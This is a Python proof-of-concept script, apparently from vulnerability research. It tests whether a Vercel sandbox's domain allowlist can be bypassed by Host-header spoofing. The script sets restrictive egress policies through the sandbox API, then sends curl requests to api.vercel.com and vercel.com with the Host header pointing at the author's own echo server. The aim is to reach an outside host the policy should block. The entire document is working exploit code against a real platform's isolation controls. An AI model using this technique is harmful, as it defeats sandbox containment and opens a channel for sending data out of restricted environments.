# -*- coding: utf-8 -*-
"""完整攻击链实验: Host 伪造 -> 边缘 vhost 路由 -> 自有 echo 接收端
A: 沙箱内公网直连 echo (SNI=echo 域名, 基线确认 echo 可用)
B: 沙箱内 SNI=api.vercel.com + Host=echo 域名 -> 边缘路由 -> echo 回显 headers
C: 对照 SNI=vercel.com + Host=echo 域名
D: h2 :authority 变体
"""
import json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

ECHO = 'sbx-echo-e29ca9cb.vercel.app'

def get_sandbox(name):
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (name, TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    if d['sandbox'].get('status') != 'running':
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (name, TEAM, PROJ))
        d = json.loads(r)
        sid = d['sandbox']['currentSessionId']
        print('[%s] resumed sid: %s' % (name, sid), flush=True)
        time.sleep(5)
    return sid

def set_policy(sid, body, tag):
    c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), body)
    print('[%s] set_policy http=%d' % (tag, c), flush=True)
    time.sleep(3)

def run(sid, tag, sc):
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=90000)
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    print('[%s] %s' % (tag, out[:1500]), flush=True)

sid = get_sandbox('tinj1')
print('sid:', sid, flush=True)

# A. 沙箱内公网直连 echo (allow-all 下) -> 确认 echo 可用
set_policy(sid, {"mode": "allow-all"}, 'ALLOW-ALL')
run(sid, 'A-direct-echo',
    'curl -s -m 15 "https://%s/a" -H "X-Marker: from-sandbox" 2>&1 | head -c 800' % ECHO)

# B. SNI=api.vercel.com + Host=echo (核心实验)
set_policy(sid, {"mode": "custom", "allowedDomains": ["api.vercel.com"]}, 'ALLOW-API')
run(sid, 'B-fakehost-echo',
    'curl -s -m 15 --http1.1 "https://api.vercel.com/anything" -H "Host: %s" -H "X-Marker: fakehost-test" 2>&1 | head -c 1500' % ECHO)

# C. 对照: SNI=vercel.com + Host=echo
set_policy(sid, {"mode": "custom", "allowedDomains": ["vercel.com"]}, 'ALLOW-VERCEL')
run(sid, 'C-sni-vercel-fakehost',
    'curl -s -m 15 --http1.1 "https://vercel.com/anything" -H "Host: %s" -H "X-Marker: fakehost2" 2>&1 | head -c 1500' % ECHO)

print('=== CHAIN DONE ===', flush=True)
